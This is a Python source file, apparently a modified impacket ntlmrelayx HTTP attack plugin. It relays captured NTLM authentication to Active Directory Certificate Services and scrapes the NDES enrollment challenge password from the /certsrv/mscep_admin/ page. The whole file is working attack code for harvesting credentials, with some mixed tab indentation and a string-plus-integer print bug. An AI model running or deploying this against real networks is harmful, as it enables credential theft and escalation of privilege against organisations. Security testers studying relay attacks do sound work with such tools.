from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from impacket.examples.ntlmrelayx.attacks.httpattacks.adcsattack import ADCSAttack

PROTOCOL_ATTACK_CLASS = "HTTPAttack"

class HTTPAttack(ProtocolAttack, ADCSAttack):
    PLUGIN_NAMES = ["HTTP", "HTTPS"]

    def run(self):

        if self.config.isADCSAttack:
            ADCSAttack._run(self)
        else:
            print('[*] Connecting to /certsrv/mscep_admin/')
            self.client.request('GET', '/certsrv/mscep_admin/')
            r1 = self.client.getresponse()
            
            if r1.status != 200:
            	print('[-] Got HTTP code ' + r1.status)
            	return
    	    	
            print('[*] Authenticated successfully')
            
            data1 = r1.read()
            try:
               	data1 = data1.decode("utf-16")
            except UnicodeDecodeError:
                data1 = data1[:-1].decode("utf-16")
    	    
            if 'Network Device Enrollment Service' not in data1:
                print('[-] NDES not found in /certsrv/mscep_admin/! Could be configured in a different folder')
                return
            if 'You do not have sufficient permission' in data1:
                print('[-] Relayed user doesn\'t have Enroll permission on the template!')
                return
            if 'The password cache is full' in data1:
            	print('[-] The NDES password cache is full!')
            	return
                
            if 'will not expire' in data1:
            	print('[*] Static password in use, it won\'t expire')
            else:
            	durStart = 'will expire within '
            	durEnd = ' minutes'
            	duration = data1[data1.find(durStart)+len(durStart):data1.rfind(durEnd)]
            	print('[*] OTP expires in ' + duration + ' minutes')
    	    
            start = 'password is: <B> '
            end = '</B>'
            password = data1[data1.find(start)+len(start):data1.rfind(end)]
    	    
            print('[*] NDES password: ' + password)